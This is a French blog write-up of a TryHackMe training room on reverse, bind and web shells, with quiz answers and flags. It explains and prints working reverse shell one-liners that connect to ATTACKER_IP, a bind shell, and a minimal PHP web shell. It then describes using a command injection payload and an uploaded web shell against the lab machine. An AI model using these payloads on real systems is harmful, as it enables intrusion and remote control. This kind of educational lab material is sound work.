---
title: "TryHackMe - Shells Overview"
date: 2025-10-24 16:41:00 +0200
categories: [TryHackMe, Learning]
tags: [reverse-shell, shell, web-shell, bind-shell]
description: "Write-up de la room Shell Overview qui nous apprendra à connaître les différents shells qui existent, comment les utiliser et les exploiter"
image:
  path: /assets/img/posts/tryhackme-shells-overview.png
  alt: "shells overview"
---

## Informations sur la room

On va apprendre les différents types de shells

**Lien :** [Shells Overview](https://tryhackme.com/room/shellsoverview)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Comprendre les shells en sécurité offensive 
- Configurer et utiliser les reverse shells et de liaison (bind shells)
- Déployer des shells Web

---

## Solutions des tâches

### Task 1 - Room Introduction

Dans le domaine de la cybersécurité, les **shells** sont largement utilisés par les attaquants pour contrôler les systèmes **à distance**, ce qui en fait un élément important de la chaîne d'attaque. Dans cette salle, nous explorerons différents shells utilisés en matière de sécurité offensive, leurs différences et leurs cas d'utilisation. Ces connaissances peuvent contribuer à améliorer les compétences en matière de tests d'intrusion et d'exploitation, et nous aident également à comprendre comment détecter lorsqu'un shell distant est utilisé par un attaquant au sein d'une organisation.

**Mises en garde**

L'utilisation de **Metasploit** ou d'autres frameworks qui génèrent ou interagissent avec des shells a été intentionnellement laissée de côté dans cette salle. Il s'agit de se concentrer sur la compréhension du fonctionnement des shells sans l'utilisation ou l'assistance d'un outil pour configurer ou générer un shell. De plus, pour cette salle, nous utiliserons le système d'exploitation Linux pour **tous les exemples**.

### Task 2 - Shell Overview

**Qu'est-ce qu'un shell ?**

Un shell est un logiciel qui nous permet d'interagir avec l'OS, il peut être graphique ou le plus souvent en ligne de commande (terminal)

Voici un petit lexique en anglais cette fois-ci pour nous mettre un peu les bases :
- `Remote system control` → autorise l'attaquant à exécuter des commandes à distance
- `Privilege escalation` → escalation de privilèges en français et c'est d'augmenter nos privilèges sur une machine pour avoir le droit de faire certaines choses dont on n'aurait pas eu le droit de base
- `Data exfiltration` → une fois qu'un ou des attaquants sont dans une machine, ils peuvent y copier des fichiers importants pour y voler des données sensibles ou même les supprimer
- `Persistance and maintenance access` → une fois que les attaquants ont trouvé un accès, ils doivent trouver un autre moyen d'aller plus loin dans le système avec les utilisateurs présents sur la machine cible par exemple ou à la fin passer admin (**root**)
- `Access other systems on the network` → selon les intentions de l'attaquant, le shell obtenu peut n'être qu'un premier point d'accès. L'objectif peut être de parcourir le réseau jusqu'à une cible différente en utilisant le shell obtenu comme pivot vers différents points du réseau système compromis. Ceci est également connu sous le nom de **pivotement**.

---

**What is the command-line interface that allows users to interact with an operating system?**

**Réponse :** `shell`

**What process involves using a compromised system as a launching pad to attack other machines in the network?**

Oui bon moi je l'ai mis en français mais c'est pas compliqué de traduire

**Réponse :** `Pivoting`

**What is a common activity attackers perform after obtaining shell access to escalate their privileges?**

**Réponse :** `Privilege Escalation`

### Task 3 - Reverse Shell

Un reverse shell, ou shell inversé, souvent appelé `connect back shell`, est l'une des techniques les plus populaires pour gagner l'accès à un système.

#### Comment ça marche un reverse shell ?

Pour faire ceci, nous devons d'abord mettre en place ce qu'on appelle un `listener` qui va d'abord écouter sur un port de notre IP pour pouvoir récupérer le signal qu'on lui enverra de la machine cible plus tard. On utilise l'outil `netcat` comme ceci :

```bash
attacker@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
```

- `-l` indique à **netcat** d'attendre une connexion
- `-v` active le mode verbeux de netcat, c'est-à-dire que dans le terminal nous allons voir exactement **tout** ce qu'il se passe
- `-n` empêche les connexions d'utiliser DNS pour la recherche, il ne résoudra donc aucun nom d'hôte et utilisera une adresse IP
- `-p` indique le port sur lequel netcat va écouter, dans notre cas il va écouter sur le port `443`

> Tous les ports peuvent être utilisés avec netcat
{: .prompt-info}

#### Gagner un accès à un reverse shell 

Bon alors moi j'utilise un outil très connu pour les reverse shells qui a été fait par le 1er de TryHackMe, je parle bien de [0day](https://tryhackme.com/p/0day) il a fait ce site : [revshells.com](https://www.revshells.com/)

Et avec ça on peut faire facilement des reverse shells selon la machine qui se présente à nous.

Mais maintenant nous allons comprendre une commande typique comme celle-ci nommée **pipe reverse shell** :

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

Explication de ce payload :
- `rm -f /tmp/f` cette commande supprime totalement le fichier nommé `f` dans /tmp
- `mkfifo /tmp/f` cette commande crée un canal nommé, ou FIFO (premier entré, premier sorti), dans /tmp/f. Les canaux nommés permettent une communication bidirectionnelle entre les processus. Dans ce contexte, il agit comme un canal d'entrée et de sortie
- `cat /tmp/f` cette commande lit les données du canal nommé. Il attend les entrées qui peuvent être envoyées via le canal.
- `| bash -i 2>&1` ce qu'allait afficher la commande avant de cat est redirigé vers une instance bash (bash -i) qui permettra à l'attaquant d'exécuter des commandes. Le `2>&1` redirige l'erreur standard vers la sortie standard, garantissant que les messages d'erreur sont renvoyés à l'attaquant.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` c'est là que rentre en jeu notre `netcat` mis en place tout à l'heure, donc **nc** redirige l'output vers notre IP en tant qu'attaquant et le port qu'on avait mis en place où notre listener attend toujours
- `>/tmp/f` cette dernière partie renvoie la sortie des commandes dans le canal nommé, permettant une communication bidirectionnelle

#### Comment l'attaquant reçoit le shell ?

Une fois la commande précédente exécutée, il faut qu'on retourne sur notre terminal avec netcat qui nous attend

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

Et si il y a quelque chose c'est que ça a marché et comme nous pouvons le voir, notre command line n'est pas la même qu'au début `target@tryhackme:~$`

---

**What type of shell allows an attacker to execute commands remotely after the target connects back?**

**Réponse :** `Reverse Shell`

**What tool is commonly used to set up a listener for a reverse shell?**

**Réponse :** `netcat`

### Task 4 - Bind Shell

Comme son nom l'indique, un **shell de liaison** (bind shell) liera un port sur le système compromis et écoutera une connexion ; lorsque cette connexion se produit, elle expose la session shell afin que l'attaquant puisse exécuter des commandes à distance.

Voici un exemple de bind shell :

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Explication du payload :
- `rm -f /tmp/f` même chose que la dernière fois
- `mkfifo /tmp/f` même chose que la dernière fois
- `cat /tmp/f` même chose que la dernière fois
- `| bash -i 2>&1` même chose que la dernière fois
- `| nc -l 0.0.0.0 8080` démarre Netcat en mode écoute (-l) sur **toutes les interfaces** (0.0.0.0) et le port **8080**. Le shell sera exposé à l'attaquant une fois connecté à ce port.
- `>/tmp/f` même chose que la dernière fois

Une fois la commande lancée sur l'attaquant on peut s'y connecter de cette façon : `nc -nv TARGET_IP 8080`


```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

---

**What type of shell opens a specific port on the target for incoming connections from the attacker?**

**Réponse :** `Bind Shell`

**Listening below which port number requires root access or privileged permissions?**

J'ai cherché sur internet et j'ai trouvé :

**Réponse :** `1024`

### Task 5 - Shell Listeners

Comme nous l'avons appris lors des tâches précédentes, un reverse shell se connectera **de la cible compromise à la machine de l'attaquant**. Un utilitaire comme Netcat gérera la connexion et permettra à l'attaquant d'interagir avec le shell exposé, mais Netcat n'est pas le seul utilitaire qui nous permettra de le faire.

#### Rlwrap

Il s'agit d'un petit utilitaire qui utilise la bibliothèque GNU readline pour fournir l'édition du clavier et de l'historique.

```bash
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Cela enveloppe `nc` avec `rlwrap`, permettant l'utilisation de fonctionnalités telles que les **touches directionnelles** et **l'historique** pour une meilleure interaction.

#### Ncat

**Ncat** est une version améliorée de **Netcat** distribuée par le projet **NMAP**. Il fournit des fonctionnalités supplémentaires, comme le cryptage (SSL).

```bash
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

Exemple avec un reverse shell **SSL**

```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

#### Socat

C'est un utilitaire qui permet de créer une connexion **socket** entre deux sources de données, en l'occurrence deux hôtes différents.

```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

La commande ci-dessus utilise l'option `-d` pour activer la sortie détaillée ; l'utiliser à nouveau (`-d -d`) augmentera la verbosité des commandes. L'option `TCP-LISTEN:443` crée un **écouteur TCP** sur le port **443**, établissant un socket serveur pour les connexions entrantes. Enfin, l'option **STDOUT** dirige toutes les données entrantes vers le terminal.

---

**Which flexible networking tool allows you to create a socket connection between two data sources?**

**Réponse :** `socat`

**Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?**

**Réponse :** `rlwrap`

**What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?**

**Réponse :** `ncat`

### Task 6 - Shell Payloads

Un Shell Payload peut être une commande ou un script qui expose le shell à une **connexion entrante** dans le cas d'un shell de liaison ou à une connexion d'envoi dans le cas d'un reverse shell.

#### Bash

Un reverse shell normal en bash

```bash
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

Ce reverse shell lance un shell bash interactif qui redirige les **entrées et les sorties** via une connexion **TCP** vers l'adresse IP de l'attaquant (`ATTACKER_IP`) sur le port 443. L'opérateur `>&` combine à la fois la sortie standard et l'erreur standard.

Ensuite nous avons le reverse shell en "lecture de ligne" désolé j'arrive pas à le traduire, (read line reverse shell)

```bash
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

Ce reverse shell crée un nouveau descripteur de fichier (**5** dans ce cas) et se connecte à un **socket TCP**. Il lira et exécutera les commandes du socket, renvoyant la sortie via le même socket.

Mais bon il y a juste ÉNORMÉMENT de reverse shells possibles donc encore une fois je vous redirige vers le meilleur site pour faire ceci [revshells.com](https://www.revshells.com/)

---

**Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?**

**Réponse :** `subprocess`

**What shell payload method in a common scripting language uses the exec, shell_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection?**

**Réponse :** `PHP`

**Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?**

**Réponse :** `python`

### Task 7 - Web Shell

Un **shell Web** est un script écrit dans un langage pris en charge par un serveur Web compromis qui exécute des commandes via le serveur Web **lui-même**. Un shell Web est généralement un fichier contenant le code qui exécute les commandes et gère les fichiers. Il peut être caché dans une application ou un service Web compromis, ce qui le rend difficile à détecter et très populaire parmi les attaquants.

Les shells Web peuvent être écrits dans plusieurs langages pris en charge par les serveurs Web, comme `PHP`, `ASP`, `JSP` et même de simples scripts `CGI`.

Voici un exemple de web shell PHP

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Le shell ci-dessus peut être enregistré dans un fichier avec l'extension **PHP**, comme **shell.php**, puis téléchargé sur le serveur Web par l'attaquant en exploitant des vulnérabilités telles que le téléchargement de fichiers sans restriction, l'inclusion de fichiers, l'injection de commandes, entre autres, ou en y obtenant un accès non autorisé.

Une fois le **shell Web** déployé sur le serveur, il est accessible via l'URL où le shell Web est hébergé, dans cet exemple `http://victim.com/uploads/shell.php`. Comme nous l'avons observé à partir du code de **shell.php**, nous devons fournir une méthode `GET` et la valeur de la variable `cmd`, qui doit contenir la commande que l'attaquant souhaite exécuter. Par exemple, si nous voulons exécuter la commande `whoami`, la requête à l'URL doit être :

```bash
http://victim.com/uploads/shell.php?cmd=whoami
```

#### Shell web existant disponible en ligne

La puissance des langages pris en charge par les serveurs Web peut donner lieu à des shells Web dotés de **nombreuses fonctionnalités** et éviter en même temps la détection. Explorons quelques-uns des shells Web les plus populaires disponibles en ligne.

En premier nous avons le fameux [p0wny-shell](https://github.com/flozz/p0wny-shell) - Un shell Web PHP minimaliste à fichier unique qui permet l'exécution de commandes à distance.

![p0wny-shell](https://github.com/flozz/p0wny-shell/raw/master/screenshot.png)

Ensuite nous avons en deuxième place [b374k](https://github.com/b374k/b374k) - Un shell Web PHP plus riche en fonctionnalités avec gestion de fichiers et exécution de commandes, entre autres fonctionnalités.

![b374k](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563529904.png)

Et pour finir nous retrouvons [c99 shell](https://www.r57shell.net/single.php?id=13) - Un shell Web PHP bien connu et robuste avec des fonctionnalités étendues.

![c99](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563530257.png)

Sinon on peut retrouver plus de shells ici [r57shell](https://www.r57shell.net/index.php)

---

**What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?**

**Réponse :** `Unrestricted File Upload`

**What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?**

**Réponse :** `web shell`

### Task 8 - Practical Task

Maintenant nous allons pratiquer, voici les indices qu'on a :

- `10.10.40.201:8080` hosts the landing page
- `10.10.40.201:8081` hosts the web application that is vulnerable to command injection.
- `10.10.40.201:8082` hosts the web application that is vulnerable to an unrestricted file upload.

Ok bon en premier mettons en place notre écouteur avec `nc -lvnp 4444` et testons.... longtemps après j'ai compris que c'était un prompt qui était sûrement appelé comme ceci : `ping -c 1 ma_commande` donc sur Linux ce qu'on peut faire pour exécuter plusieurs commandes à la suite c'est de mettre un `;` à la fin

Donc on doit encadrer notre commande avec des `;` pour qu'elle soit bien exécutée et ensuite j'ai testé avec les premières commandes qu'on nous a données comme exemple et celle-ci a marché : `; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.9.0.43 4444 > /tmp/f ;` j'ai bien sûr changé le port et l'IP

Ensuite voici ce que le netcat a affiché

```bash
┌──(omnimessie㉿omnimessie)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.0.43] from (UNKNOWN) [10.10.40.201] 44382
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dbbcdcd6eac7:/var/www/html$ ls
ls
hello.txt
index.php
style.css
```

Donc j'étais bien rentré dans la machine, mais je n'étais pas au bon endroit car dans l'énoncé il était dit que le flag se trouvait dans `/` donc j'ai fait `cd /` et ensuite `cat flag.txt`

**Réponse :** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

**Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?**

Maintenant on passe sur les web shells, sur le port `8082` et c'est une page où on peut mettre des fichiers, donc nous allons faire le nôtre en PHP pour commencer.

J'ai pris le script le plus basique pour faire un web shell en PHP donné en exemple sur la task 7, je l'ai injecté dans le site avec le nom `shell.php`.

Une fois le fichier sur le site nous devons aller le chercher nous-même, l'activer en quelque sorte, et pour ce faire nous devons aller là où les fichiers se téléchargent pour un site web, c'est-à-dire le `/uploads/` suivi du nom de notre fichier `/uploads/shell.php`

Une fois qu'on est sur cette URL nous apercevons une page blanche, ce qui est normal car maintenant dans l'URL nous pouvons exécuter des commandes comme ceci avec le flag `cmd` → `http://10.10.40.201:8082/uploads/shell.php?cmd=whoami`

Dans cet exemple la commande `whoami` va s'exécuter, alors j'ai remplacé le whoami par `cd /; cat flag.txt` car je connais l'emplacement du fichier et son nom.

**Réponse :** `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

### Task 9 - Conclusion

Dans cette salle, nous avons découvert les **Reverse Shells**, les **Bind Shells** et les **Web Shells**, en quoi ils sont essentiels pour les attaquants, les testeurs d'intrusion et les défenseurs, et comment les identifier.

**Room Complétée**

{% include comments.html %}